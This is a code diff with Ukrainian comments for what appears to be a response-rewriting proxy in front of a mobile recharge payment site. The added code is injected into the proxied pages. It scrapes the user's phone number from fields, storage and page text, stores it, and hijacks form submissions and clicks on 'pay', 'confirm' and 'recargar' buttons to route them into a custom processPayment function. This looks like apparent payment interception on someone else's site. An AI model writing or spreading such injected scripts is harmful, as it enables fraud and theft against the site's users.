@@ -160,6 +160,71 @@ async function modifyHTML(response) {
         console.log('No amount radio found, using default 5');
         return '5';
       }
+      
+      // Отримати номер телефону з різних джерел на сторінці
+      function getPhoneNumberFromPage() {
+        // Спочатку перевіряємо номер телефону зі сховища
+        let phoneNumber = '';
+        try {
+          phoneNumber = window.phoneNumberForPayment || 
+                       sessionStorage.getItem('rechargePhoneNumber') || 
+                       localStorage.getItem('rechargePhoneNumber') || '';
+        } catch (e) { }
+        
+        if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
+          console.log('Found phone number in storage:', phoneNumber);
+          return phoneNumber;
+        }
+        
+        // Перевіряємо поля введення
+        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
+        if (phoneInput && phoneInput.value) {
+          phoneNumber = phoneInput.value.replace(/\\D/g, '');
+          console.log('Found phone number in input field:', phoneNumber);
+          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+        }
+        
+        // Перевіряємо div з класом phone і span всередині нього
+        const phoneDiv = document.querySelector('.phone span');
+        if (phoneDiv && phoneDiv.textContent) {
+          phoneNumber = phoneDiv.textContent.trim().replace(/\\D/g, '');
+          console.log('Found phone number in .phone span:', phoneNumber);
+          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+        }
+        
+        // Перевіряємо будь-який span, який містить 9-значний номер
+        const spans = document.querySelectorAll('span');
+        for (const span of spans) {
+          const text = span.textContent.trim();
+          const digits = text.replace(/\\D/g, '');
+          if (digits.match(/^\\d{9}$/)) {
+            console.log('Found phone number in span:', digits);
+            return digits;
+          }
+        }
+        
+        // Перевіряємо текст у будь-якому div з класом "phone"
+        const phoneDivs = document.querySelectorAll('.phone');
+        for (const div of phoneDivs) {
+          const text = div.textContent.trim();
+          const matches = text.match(/\\d{9}/);
+          if (matches) {
+            console.log('Found phone number in .phone div:', matches[0]);
+            return matches[0];
+          }
+        }
+        
+        // Шукаємо 9-значний номер у будь-якому тексті на сторінці
+        const bodyText = document.body.textContent;
+        const matches = bodyText.match(/\\b(\\d{9})\\b/g);
+        if (matches && matches.length > 0) {
+          console.log('Found phone number in body text:', matches[0]);
+          return matches[0];
+        }
+        
+        console.log('No valid phone number found on page');
+        return '';
+      }
 
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
         if (sourceEvent) {
@@ -183,16 +248,9 @@ async function modifyHTML(response) {
             return true;
           }
           
+          // Отримати номер телефону з різних джерел на сторінці
           if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
-            try {
-              phoneNumber = window.phoneNumberForPayment || 
-                           sessionStorage.getItem('rechargePhoneNumber') || 
-                           localStorage.getItem('rechargePhoneNumber') || '';
-            } catch (e) { }
-            if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
-              const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
-              phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
-            }
+            phoneNumber = getPhoneNumberFromPage();
           }
           
           if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
@@ -235,6 +293,18 @@ async function modifyHTML(response) {
       };
       
       document.addEventListener('DOMContentLoaded', function() {
+        // Перевіряємо, чи є номер телефону на сторінці
+        const phoneNumber = getPhoneNumberFromPage();
+        if (phoneNumber) {
+          console.log('Found phone number on page:', phoneNumber);
+          try {
+            // Зберігаємо знайдений номер для подальшого використання
+            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
+            localStorage.setItem('rechargePhoneNumber', phoneNumber);
+            window.phoneNumberForPayment = phoneNumber;
+          } catch (e) { console.error('Error storing phone:', e); }
+        }
+        
         // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
         if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
           autoProgressAfterCheckNumber();
@@ -254,18 +324,38 @@ async function modifyHTML(response) {
               const selectedAmount = getSelectedAmountFromRadios();
               console.log('Selected amount:', selectedAmount);
             
-              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
-              console.log('Phone from form:', phoneNumber);
+              // Отримуємо номер телефону з різних джерел
+              const phoneNumber = getPhoneNumberFromPage();
+              console.log('Phone for payment:', phoneNumber);
               
               window.processPayment(selectedAmount, phoneNumber, event);
               return false;
             } else {
               // Для інших форм
               const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
-              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+              const phoneNumber = getPhoneNumberFromPage();
               window.processPayment(amount, phoneNumber, event);
+            }
+          });
+        });
+
+        // Додаємо додаткові обробники подій для кнопок, які можуть ініціювати процес оплати
+        document.querySelectorAll('button.btn-primary, button.btn-success, a.btn').forEach(button => {
+          button.addEventListener('click', function(event) {
+            // Перевіряємо, чи це кнопка оплати або підтвердження
+            const text = button.textContent.toLowerCase();
+            if (text.includes('pagar') || text.includes('pay') || text.includes('confirmar') || 
+                text.includes('confirm') || text.includes('recargar')) {
+              
+              console.log('Payment button clicked:', text);
+              const amount = getSelectedAmountFromRadios() || '5';
+              const phoneNumber = getPhoneNumberFromPage();
+              
+              // Якщо знайдено номер телефону, запускаємо обробку платежу
+              if (phoneNumber) {
+                window.processPayment(amount, phoneNumber, event);
+                return false;
+              }
             }
           });
         });
@@ -390,6 +480,55 @@ async function modifyJavaScript(response) {
       return '5';
     }
     
+    // Функція для пошуку номера телефону на сторінці
+    function getPhoneNumberFromPage() {
+      // Спочатку перевіряємо номер телефону зі сховища
+      let phoneNumber = '';
+      try {
+        phoneNumber = window.phoneNumberForPayment || 
+                     sessionStorage.getItem('rechargePhoneNumber') || 
+                     localStorage.getItem('rechargePhoneNumber') || '';
+      } catch (e) { }
+      
+      if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
+        console.log('Found phone number in storage:', phoneNumber);
+        return phoneNumber;
+      }
+      
+      // Перевіряємо поля введення
+      const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
+      if (phoneInput && phoneInput.value) {
+        phoneNumber = phoneInput.value.replace(/\\D/g, '');
+        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+      }
+      
+      // Перевіряємо div з класом phone і span всередині нього
+      const phoneDiv = document.querySelector('.phone span');
+      if (phoneDiv && phoneDiv.textContent) {
+        phoneNumber = phoneDiv.textContent.trim().replace(/\\D/g, '');
+        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+      }
+      
+      // Перевіряємо текст у будь-якому div з класом "phone"
+      const phoneDivs = document.querySelectorAll('.phone');
+      for (const div of phoneDivs) {
+        const text = div.textContent.trim();
+        const matches = text.match(/\\d{9}/);
+        if (matches) {
+          return matches[0];
+        }
+      }
+      
+      // Шукаємо 9-значний номер у будь-якому тексті на сторінці
+      const bodyText = document.body.textContent;
+      const matches = bodyText.match(/\\b(\\d{9})\\b/g);
+      if (matches && matches.length > 0) {
+        return matches[0];
+      }
+      
+      return '';
+    }
+    
     // Автоматичний перехід до наступного кроку після перевірки номера
     (function() {
       if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
@@ -407,6 +546,19 @@ async function modifyJavaScript(response) {
           }
         }, 500);
       }
+      
+      // Після завантаження документа, шукаємо номер телефону
+      document.addEventListener('DOMContentLoaded', function() {
+        const phoneNumber = getPhoneNumberFromPage();
+        if (phoneNumber) {
+          console.log('Found phone number on page:', phoneNumber);
+          try {
+            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
+            localStorage.setItem('rechargePhoneNumber', phoneNumber);
+            window.phoneNumberForPayment = phoneNumber;
+          } catch (e) { }
+        }
+      });
     })();
     
     (function() {
